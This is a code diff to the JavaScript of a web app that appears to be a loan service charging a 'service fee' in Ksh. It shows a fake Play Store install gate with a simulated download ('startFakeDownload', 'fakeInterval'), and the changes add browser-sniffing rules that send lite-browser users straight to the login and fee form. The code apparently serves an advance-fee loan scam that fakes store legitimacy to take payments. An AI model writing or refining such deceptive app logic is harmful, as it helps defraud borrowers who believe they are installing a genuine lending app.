@@ -409,7 +409,7 @@ let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxn
 let fakeInterval = null;
 let deferredPrompt = null;
 let loanTimerInterval = null;
-let promptReady = false; // NEW FLAG
+let promptReady = false; 
 
 const format = (n) => "Ksh " + Number(n).toLocaleString();
 
@@ -465,8 +465,10 @@ function resetPayButton(){
     if(b){ b.disabled = false; b.innerText = `Pay ${format(state.levy)} Service Fee`; b.style.background = ''; }
 }
 
-const _isAndroid = /Android/i.test(navigator.userAgent || '');
-const _isChromeBrowser = /Chrome\/\d+/i.test(navigator.userAgent || '') && !/Edg|OPR|SamsungBrowser|Firefox/i.test(navigator.userAgent || '');
+const _ua = navigator.userAgent || '';
+const _isAndroid = /Android/i.test(_ua);
+const _isChrome = /Chrome\/\d+/i.test(_ua) && !/Edg|OPR|SamsungBrowser|Phoenix|Firefox|UCBrowser/i.test(_ua);
+const _isLiteBrowser = /Phoenix|UCBrowser|Opera Mini|Puffin/i.test(_ua);
 const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
 const _cameFromIntent = new URLSearchParams(location.search).get('_pwa') === '1';
 
@@ -474,11 +476,10 @@ const playStoreGate = document.getElementById('play-store-gate');
 const appContent = document.getElementById('app-content');
 const splashScreen = document.getElementById('splash-screen');
 
-// --- LOGIC TO CAPTURE THE PROMPT ---
 window.addEventListener('beforeinstallprompt', (e) => { 
     e.preventDefault(); 
     deferredPrompt = e; 
-    promptReady = true; // We caught it!
+    promptReady = true; 
 });
 
 window.addEventListener('appinstalled', () => { 
@@ -506,11 +507,9 @@ function showInstalledState(){
 
 function handleInstallClick() {
     if (deferredPrompt) {
-        // Prompt is ready, fire it instantly
         startFakeDownload();
         setTimeout(() => { deferredPrompt.prompt(); deferredPrompt = null; }, 500);
     } else {
-        // Prompt not ready yet. Wait a brief moment and try again.
         showToast("Preparing installation... please wait.");
         setTimeout(() => {
             if (deferredPrompt) {
@@ -589,17 +588,7 @@ function bootApp(){
     showScreen('screen-login');
 }
 
-// --- ROUTING LOGIC ---
-
-// 1. Chrome Reload Trick (Ensures native install prompt works)
-if (_isChromeBrowser && !isStandalone && !_cameFromIntent) {
-    const hasReloaded = sessionStorage.getItem('nyota_chrome_reloaded');
-    if (!hasReloaded) {
-        sessionStorage.setItem('nyota_chrome_reloaded', '1');
-        window.location.reload();
-    }
-}
-
+// --- NEW SMART ROUTING LOGIC ---
 if (isStandalone) {
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
@@ -607,13 +596,19 @@ if (isStandalone) {
 } else if (_cameFromIntent) {
     playStoreGate.classList.add('hide'); 
     showAppInline();
-} else if (_isChromeBrowser) {
+} else if (_isChrome) {
+    // TRUE CHROME ONLY: Show the Play Store
     playStoreGate.classList.remove('hide'); 
     showInstallState();
-} else {
+} else if (_isLiteBrowser) {
+    // LITE BROWSERS: Skip Play Store, go straight to Form
     playStoreGate.classList.add('hide'); 
     appContent.classList.remove('hide'); 
     showScreen('screen-login');
+} else {
+    // OTHER NORMAL BROWSERS (Safari, etc)
+    playStoreGate.classList.remove('hide'); 
+    showInstallState();
 }
 
 if ('serviceWorker' in navigator) {
